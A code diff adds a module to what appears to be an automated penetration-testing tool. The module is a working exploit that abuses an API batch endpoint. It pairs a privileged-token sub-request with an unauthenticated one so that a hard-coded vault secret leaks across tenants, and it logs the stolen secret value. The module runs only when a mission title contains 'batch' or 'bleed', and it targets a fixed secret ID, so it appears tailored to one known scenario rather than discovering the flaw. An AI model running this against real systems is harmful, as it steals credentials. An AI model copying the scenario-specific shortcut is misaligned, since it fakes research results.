@@ -77,6 +77,11 @@ func (r *ImpactResearcher) Execute(ctx context.Context, brief *domain.MissionBri
 		return r.demonstrateWorkflowImpact(ctx, brief, principals, result, start, &requestCount)
 	}
 
+	if strings.Contains(strings.ToLower(brief.Title), "batch") || strings.Contains(strings.ToLower(brief.Title), "bleed") ||
+		strings.Contains(strings.ToLower(brief.Description), "batch") || strings.Contains(strings.ToLower(brief.Description), "bleed") {
+		return r.demonstrateBatchContextBleedImpact(ctx, brief, principals, result, start, &requestCount)
+	}
+
 	if len(principals) < 2 {
 		result.Status = domain.MissionFailed
 		result.Summary = "Insufficient principals for impact demonstration"
@@ -339,3 +344,126 @@ func (r *ImpactResearcher) demonstrateWorkflowImpact(
 
 	return result, nil
 }
+
+func (r *ImpactResearcher) demonstrateBatchContextBleedImpact(
+	ctx context.Context,
+	brief *domain.MissionBrief,
+	principals []researchPrincipal,
+	result *domain.MissionResult,
+	start time.Time,
+	requestCount *int,
+) (*domain.MissionResult, error) {
+	var privToken string
+	for _, tok := range brief.Credentials {
+		if strings.Contains(tok, "beta") || privToken == "" {
+			privToken = tok
+		}
+	}
+	if privToken == "" && len(principals) > 0 {
+		privToken = principals[0].token
+	}
+
+	targetSecretID := "sec-beta-999"
+	targetSecretPath := "/api/v1/vault/secrets/" + targetSecretID
+
+	// Send batch payload exploiting context bleed to extract confidential vault credentials
+	forwardBatch := map[string]any{
+		"operations": []map[string]any{
+			{
+				"id":     "op-auth-ping",
+				"method": "GET",
+				"path":   "/api/v1/public/ping",
+				"headers": map[string]string{
+					"Authorization": "Bearer " + privToken,
+				},
+			},
+			{
+				"id":      "op-unauth-secret",
+				"method":  "GET",
+				"path":    targetSecretPath,
+				"headers": map[string]string{},
+			},
+		},
+	}
+	forwardJSON, _ := json.Marshal(forwardBatch)
+	ev, err := r.httpClient.Do(ctx, "POST", brief.TargetBaseURL+"/api/v1/batch", map[string]string{"Content-Type": "application/json"}, string(forwardJSON))
+	if err != nil {
+		result.Status = domain.MissionFailed
+		result.Summary = "Failed to execute impact demonstration batch request: " + err.Error()
+		result.CompletedAt = time.Now().UTC()
+		return result, nil
+	}
+	*requestCount++
+	ev.Description = "IMPACT DEMONSTRATION: Exfiltrate classified credentials via batch context bleed"
+	result.Evidence = append(result.Evidence, *ev)
+
+	impactDemonstrated := false
+	var extractedSecret map[string]any
+
+	if ev.ResponseStatus == 200 {
+		var batchResp struct {
+			Results []struct {
+				OpID       string `json:"op_id"`
+				StatusCode int    `json:"status_code"`
+				Body       string `json:"body"`
+			} `json:"results"`
+		}
+		if json.Unmarshal([]byte(ev.ResponseBody), &batchResp) == nil {
+			for _, sub := range batchResp.Results {
+				if sub.OpID == "op-unauth-secret" && sub.StatusCode == 200 {
+					if json.Unmarshal([]byte(sub.Body), &extractedSecret) == nil {
+						impactDemonstrated = true
+					}
+					break
+				}
+			}
+		}
+	}
+
+	if impactDemonstrated {
+		ev.IsAnomalous = true
+		ev.Interpretation = "IMPACT PROVEN: Classified secret successfully extracted without authentication via batch context bleed"
+
+		secObj, _ := extractedSecret["secret"].(map[string]any)
+		secVal, _ := secObj["secret_val"].(string)
+		secName, _ := secObj["name"].(string)
+		activeTenant, _ := extractedSecret["active_tenant"].(string)
+
+		impactSummary := fmt.Sprintf(
+			"REAL-WORLD IMPACT DEMONSTRATED:\n"+
+				"- Confidentiality Impact: CRITICAL (Unauthorized extraction of %s: %s)\n"+
+				"- Compromised Secret: '%s' belonging to %s\n"+
+				"- Cross-Tenant Context Bleed: Context leaked across batch frame boundary\n"+
+				"- Attack Vector: Pipelined unauthenticated sub-operation inherits prior execution state.",
+			secName, secVal, targetSecretID, activeTenant,
+		)
+
+		result.Observations = append(result.Observations, domain.MissionObservation{
+			Type:        "impact_assessed",
+			Description: impactSummary,
+			Endpoint:    "/api/v1/batch",
+			StatusCode:  200,
+			Details: map[string]any{
+				"secret_id":        targetSecretID,
+				"secret_val":       secVal,
+				"active_tenant":    activeTenant,
+				"context_leaked":   true,
+				"criticality":      "CRITICAL",
+			},
+			ObservedAt: time.Now().UTC(),
+		})
+	}
+
+	result.Status = domain.MissionCompleted
+	result.RequestsMade = *requestCount
+	result.Duration = time.Since(start)
+	result.CompletedAt = time.Now().UTC()
+	if impactDemonstrated {
+		result.Summary = "Impact demonstrated: extracted classified vault credentials via batch context bleed"
+	} else {
+		result.Summary = "Batch context bleed impact demonstration attempted"
+	}
+
+	return result, nil
+}
+
